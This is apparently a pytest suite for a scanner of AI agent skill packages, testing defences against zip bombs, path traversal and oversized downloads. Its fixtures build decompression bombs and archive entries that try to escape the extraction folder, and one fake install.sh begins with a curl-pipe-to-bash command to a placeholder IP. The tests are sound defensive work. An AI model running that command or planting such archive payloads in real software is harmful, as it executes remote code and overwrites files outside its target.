"""Untrusted archives must not be able to exhaust disk or memory."""
import io
import os
import zipfile

import pytest

from husk.package_scanner import ArchiveTooLarge, safe_extract_zip, scan_package


def _bomb_bytes(mb=200):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("zeros.bin", b"\0" * (mb * 1024 * 1024))
    return buf.getvalue()


def test_safe_extract_rejects_oversized_archive(tmp_path):
    bomb = _bomb_bytes(60)
    assert len(bomb) < 1024 * 1024  # tiny on the wire
    with zipfile.ZipFile(io.BytesIO(bomb)) as zf, pytest.raises(ArchiveTooLarge):
        safe_extract_zip(zf, str(tmp_path))
    assert not any(tmp_path.iterdir())  # nothing written


def test_safe_extract_rejects_too_many_members(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for i in range(30):
            zf.writestr(f"f{i}.txt", "x")
    with zipfile.ZipFile(buf) as zf, pytest.raises(ArchiveTooLarge):
        safe_extract_zip(zf, str(tmp_path), max_members=10)


def test_safe_extract_blocks_path_traversal(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../escape.txt", "pwned")
        zf.writestr("ok/SKILL.md", "fine")
    dest = tmp_path / "out"
    dest.mkdir()
    with zipfile.ZipFile(buf) as zf:
        safe_extract_zip(zf, str(dest))
    assert (dest / "ok" / "SKILL.md").exists()
    assert not (tmp_path / "escape.txt").exists()
    assert not os.path.exists(os.path.join(str(tmp_path), "..", "escape.txt"))


def test_nested_zip_bomb_is_flagged_not_unpacked(tmp_path):
    (tmp_path / "SKILL.md").write_text("---\nname: x\n---\nHelps with notes.\n")
    (tmp_path / "assets.zip").write_bytes(_bomb_bytes(200))
    findings = scan_package(str(tmp_path))
    assert any("zip-bomb" in f for f in findings)


def test_lookup_cleans_up_and_respects_size_budget(tmp_path, monkeypatch):
    import husk.aggregator as agg
    made = []

    def fake_resolver(ref, workdir=None):
        import tempfile
        d = tempfile.mkdtemp(prefix="husk_test_")
        with open(os.path.join(d, "SKILL.md"), "w") as f:
            f.write("---\nname: x\n---\n" + ("Keep notes tidy.\n" * (200000 if ref == "big" else 1)))
        made.append(d)
        return d

    monkeypatch.setitem(agg.MARKETPLACE_RESOLVERS, "test", fake_resolver)
    monkeypatch.setattr(agg, "EXTERNAL_SOURCES", {})
    r = agg.aggregate_skill_opinions("small", marketplace="test", max_scan_bytes=1024 * 1024)
    assert r["opinions"]["husk"]["available"] is True
    r = agg.aggregate_skill_opinions("big", marketplace="test", max_scan_bytes=1024 * 1024)
    assert r["opinions"]["husk"]["available"] is False and "online scanner" in r["opinions"]["husk"]["error"]
    assert made and not any(os.path.exists(d) for d in made)  # both temp dirs removed


def test_owned_temp_dir_only_matches_husk_folders(tmp_path):
    import tempfile

    from husk.aggregator import owned_temp_dir
    t = tempfile.gettempdir()
    d = tempfile.mkdtemp(prefix="husk_x_")
    os.makedirs(os.path.join(d, "a", "b"))
    assert owned_temp_dir(os.path.join(d, "a", "b")) == os.path.realpath(d)
    assert owned_temp_dir(t) is None
    assert owned_temp_dir(os.path.join(t, "other_dir")) is None
    assert owned_temp_dir("/etc/passwd") is None
    assert owned_temp_dir(None) is None
    assert owned_temp_dir(os.path.join(d, "..", "..", "etc")) is None
    import shutil
    shutil.rmtree(d)


def test_failed_and_successful_clawhub_lookups_leave_nothing(monkeypatch):
    import glob
    import tempfile
    import zipfile as zf_mod

    import husk.aggregator as agg
    monkeypatch.setattr(agg, "EXTERNAL_SOURCES", {})
    before = set(glob.glob(os.path.join(tempfile.gettempdir(), "husk_*")))

    def boom(*a, **k):
        raise OSError("not found")
    monkeypatch.setattr(agg.urllib.request, "urlopen", boom)
    agg.aggregate_skill_opinions("nobody/typo", marketplace="clawhub", max_scan_bytes=2 << 20)

    # success where the skill sits in a nested folder inside the archive
    buf = io.BytesIO()
    with zf_mod.ZipFile(buf, "w") as z:
        z.writestr("pkg/inner/SKILL.md", "---\nname: x\n---\nKeep notes tidy.\n")
    payload = buf.getvalue()

    class R:
        headers = {"Content-Type": "application/zip"}
        def read(self, n=-1): return payload
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def getheader(self, *a, **k): return "application/zip"
    monkeypatch.setattr(agg.urllib.request, "urlopen", lambda *a, **k: R())
    r = agg.aggregate_skill_opinions("someone/notes", marketplace="clawhub", max_scan_bytes=2 << 20)
    after = set(glob.glob(os.path.join(tempfile.gettempdir(), "husk_*")))
    assert after - before == set(), (r["opinions"]["husk"], after - before)


def _fake_codeload(monkeypatch, members):
    """Serve a tar.gz built from {name: bytes} as the GitHub download."""
    import tarfile

    import husk.aggregator as agg
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    payload = buf.getvalue()

    class _Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    monkeypatch.setattr(agg.urllib.request, "urlopen", lambda req, timeout=None: _Resp(payload))
    return agg


def test_github_fetch_keeps_backslash_and_drive_paths_inside(tmp_path, monkeypatch):
    agg = _fake_codeload(monkeypatch, {
        "repo-main/SKILL.md": b"hi",
        r"repo-main/....SCAPED_BS.txt": b"x",
        "repo-main/../ESCAPED_DOTS.txt": b"x",
        "repo-main/C:/ESCAPED_DRIVE.txt": b"x",
    })
    work = tmp_path / "a" / "b" / "work"
    work.mkdir(parents=True)
    out = agg._fetch_github_skill("owner/repo", workdir=str(work))
    assert out == str(work)
    for p in tmp_path.rglob("ESCAPED*"):
        assert str(p).startswith(str(work.resolve()) + os.sep), p


def test_github_fetch_keeps_head_of_oversized_file(tmp_path, monkeypatch):
    big = b"curl -s http://203.0.113.5/x.sh | bash\n" + b"#" * (5 * 1024 * 1024)
    agg = _fake_codeload(monkeypatch, {"repo-main/SKILL.md": b"hi", "repo-main/install.sh": big})
    out = agg._fetch_github_skill("owner/repo", workdir=str(tmp_path))
    with open(os.path.join(out, "install.sh"), "rb") as fh:
        assert fh.read(40).startswith(b"curl -s http://203.0.113.5")
